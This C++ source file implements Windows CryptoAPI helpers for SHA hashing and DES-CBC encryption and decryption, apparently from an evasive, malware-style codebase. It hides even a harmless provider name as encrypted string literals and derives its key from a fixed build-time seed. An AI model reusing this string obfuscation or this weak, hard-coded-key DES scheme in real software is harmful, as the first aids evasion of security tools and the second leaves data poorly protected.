/*
    CryptRoutines.cpp
    CryptoAPI related routines for hashing and encryption/decryption 
*/

#include <windows.h>
#include <wincrypt.h>
#include <stdexcept>
#include <vector>

#include "mem.h"
#include "dbg.h"
#include "CryptoStrings.h"
#include "MyStreams.h"
#include "RandomGen.h"
#include "HashedStrings.h"
#include "..\shared\config.h"

#include "CryptRoutines.h"

CRYPT_CONTEXT gCryptContext;    // internal context with prepared key and provider handles

/*
    Calculates SHA binary hash of passed data buffer
*/
BOOL cryptCalcHashSHA(PVOID pData, SIZE_T ulSize, PBYTE pbResultBuffer, PULONG pulBufferLen)
{
    BOOL bRes = FALSE;    // function's result

    HCRYPTPROV hCProv = 0;    // cryptoprovider handle
    HCRYPTHASH hHash = 0;    // cryptoprovider's hash object's handle 
    LPWSTR wszProviderName = 0; //L"Microsoft Base Cryptographic Provider v1.0";    // name of cryptoprovider
    ULONG ulHashLen, ulBuffLen;

    // check inputs
    if (!pData || !ulSize || !pbResultBuffer || !pulBufferLen) { DbgPrint("ERR: invalid input params"); return bRes; }

    try {
        // decrypt provider's name
        wszProviderName = CRSTRW("Microsoft Base Cryptographic Provider v1.0", "\x00\xa0\x81\x0f\x2a\xa0\xac\x0e\x13\xaa\x6e\xf4\xff\x5e\x55\x87\xf2\x79\x32\xa2\xf0\x3b\x13\x9e\x80\x2c\xee\x60\x62\xd9\xd1\x4f\x59\xfb\xe1\x17\x22\x97\x97\x0e\x14\xbd\x73\xa7\xe6\x09\x0f\x97\xd1\x66\x4c");

        // get provider context
        if (!CryptAcquireContext(&hCProv, NULL, wszProviderName, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) { 
            throw std::runtime_error("CryptAcquireContext() failed");
        }

        // create hash object
        if (!CryptCreateHash(hCProv, CALG_SHA, 0, 0, &hHash)) { 
            throw std::runtime_error("CryptCreateHash() failed");
        }

        // do the hashing
        if (!CryptHashData(hHash, (BYTE *)pData, (DWORD)ulSize, 0)) { 
            throw std::runtime_error("CryptHashData() failed");
        }

        // query binary hash size
        ulBuffLen = sizeof(ulHashLen);
        if (!CryptGetHashParam(hHash, HP_HASHSIZE, (PBYTE)&ulHashLen, &ulBuffLen, 0)) { 
            throw std::runtime_error("CryptGetHashParam() failed");
        }
        if (ulHashLen > *pulBufferLen) { 
            throw std::runtime_error("Hash length exceeds buffer size");
        }

        // get binary hash contents
        if (!CryptGetHashParam(hHash, HP_HASHVAL, pbResultBuffer, pulBufferLen, 0)) { 
            throw std::runtime_error("CryptGetHashParam() failed");
        }

        // done ok
        bRes = TRUE;
    } catch (const std::exception& e) {
        DbgPrint("ERR: %s", e.what());
    }

    // safe free mem
    if (wszProviderName) { my_free(wszProviderName); }

    // free handles, if any
    if (hHash) { CryptDestroyHash(hHash); }
    if (hCProv) { CryptReleaseContext(hCProv, 0); }

    return bRes;
}

/*
    Prepares global encryption/decryption context, if needed
*/
BOOL _cryptCheckInitContext(CRYPT_CONTEXT *Context)
{
    BOOL bRes = FALSE;

    LPWSTR wszProviderName = NULL; // decrypt buffer with name of cryptoprovider
    DWORD dwValue = 0;        // value buffer for CryptSetKeyParam() 

    HCRYPTHASH hHash = NULL;    // cryptoprovider's hash object's handle 

    // rnd chars generated to be used as encryption key
    std::vector<BYTE> key(164);

    RndClass rg = { 0 };    // rnd generator

    if (Context->bInited) { return TRUE; }

    try {
        DbgPrint("initializing crypt context");

        // decrypt provider's name
        wszProviderName = CRSTRW("Microsoft Base Cryptographic Provider v1.0", "\xfd\xdf\x33\x06\xd7\xdf\x1e\x07\xee\xd5\xdc\xfd\x02\x21\xe7\x8e\x0f\x06\x80\xab\x0d\x44\xa1\x97\x7d\x53\x5c\x69\x9f\xa6\x63\x46\xa4\x84\x53\x1e\xdf\xe8\x25\x07\xe9\xc2\xc1\xae\x1b\x76\xbd\x9e\xc6\xf2\xae");

        // get provider's context
        if (!CryptAcquireContext(&Context->hProvider, NULL, wszProviderName, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) { 
            throw std::runtime_error("CryptAcquireContext() failed");
        }

        // create hash object
        if (!CryptCreateHash(Context->hProvider, CALG_SHA, 0, 0, &hHash)) { 
            throw std::runtime_error("CryptCreateHash() failed");
        }

        // prepare and generate constant pseudo-random feed
        rgNew(&rg);
        rg.rgInitSeed(&rg, TARGET_BUILDCHAIN_HASH);
        for (auto& byte : key) {
            byte = static_cast<BYTE>(rg.rgGetRndDWORD(&rg));
        }

        // hash key's value, result will be used as the key
        if (!CryptHashData(hHash, key.data(), key.size(), 0)) { 
            throw std::runtime_error("CryptHashData() failed");
        }

        // derive key from hash value
        if (!CryptDeriveKey(Context->hProvider, CALG_DES, hHash, CRYPT_EXPORTABLE, &Context->hKey)) { 
            throw std::runtime_error("CryptDeriveKey() failed");
        }

        // encryption mode
        dwValue = CRYPT_MODE_CBC;
        CryptSetKeyParam(Context->hKey, KP_MODE, (PBYTE)&dwValue, 0);

        // padding settings
        dwValue = PKCS5_PADDING;
        CryptSetKeyParam(Context->hKey, KP_PADDING, (PBYTE)&dwValue, 0);

        // all done if got here
        DbgPrint("init ok");
        Context->bInited = TRUE;
        bRes = TRUE;
    } catch (const std::exception& e) {
        DbgPrint("ERR: %s", e.what());
    }

    // free used res
    if (wszProviderName) { my_free(wszProviderName); }
    if (hHash) { CryptDestroyHash(hHash); }

    return bRes;
}

/*
    Encrypts contents of stream passed, altering its contents and len
*/
BOOL cryptEncryptStream(MY_STREAM *mStream)
{
    BOOL bRes = FALSE;    // default result

    std::vector<BYTE> encrypted(mStream->lDataLen + 1024);
    DWORD dwEncryptedLen = mStream->lDataLen;

    if (!_cryptCheckInitContext(&gCryptContext)) { 
        DbgPrint("ERR: crypt context init failed"); 
        return bRes; 
    }

    try {
        // copy data into temp buffer
        std::copy_n(static_cast<BYTE*>(mStream->pData), mStream->lDataLen, encrypted.begin());

        // do encryption
        if (!CryptEncrypt(gCryptContext.hKey, 0, TRUE, 0, encrypted.data(), &dwEncryptedLen, encrypted.size())) { 
            throw std::runtime_error("CryptEncrypt() failed");
        }

        // done ok, replace stream contents
        mStream->lDataLen = 0;
        mStream->msWriteStream(mStream, encrypted.data(), dwEncryptedLen);

        bRes = TRUE;
    } catch (const std::exception& e) {
        DbgPrint("ERR: %s", e.what());
    }

    return bRes;
}

/*
    Decrypts passed buffer into newly allocated one
    NB: caller should dispose pDecrypted itself
*/
BOOL cryptDecryptBuffer(LPVOID pCrypted, DWORD dwCryptedLen, LPVOID *pDecryptedRes, DWORD *dwDecryptedResLen)
{
    BOOL bRes = FALSE;    // default result

    std::vector<BYTE> decrypted(dwCryptedLen);
    DWORD dwDecryptedLen = dwCryptedLen;

    if (!_cryptCheckInitContext(&gCryptContext)) { 
        DbgPrint("ERR: crypt context init failed"); 
        return bRes; 
    }

    try {
        std::copy_n(static_cast<BYTE*>(pCrypted), dwCryptedLen, decrypted.begin());

        // do decryption
        if (!CryptDecrypt(gCryptContext.hKey, 0, TRUE, 0, decrypted.data(), &dwDecryptedLen)) { 
            throw std::runtime_error("CryptDecrypt() failed");
        }

        // done ok, assign result
        *pDecryptedRes = my_alloc(dwDecryptedLen);
        std::copy_n(decrypted.begin(), dwDecryptedLen, static_cast<BYTE*>(*pDecryptedRes));
        *dwDecryptedResLen = dwDecryptedLen;

        bRes = TRUE;
    } catch (const std::exception& e) {
        DbgPrint("ERR: %s", e.what());
    }

    return bRes;
}
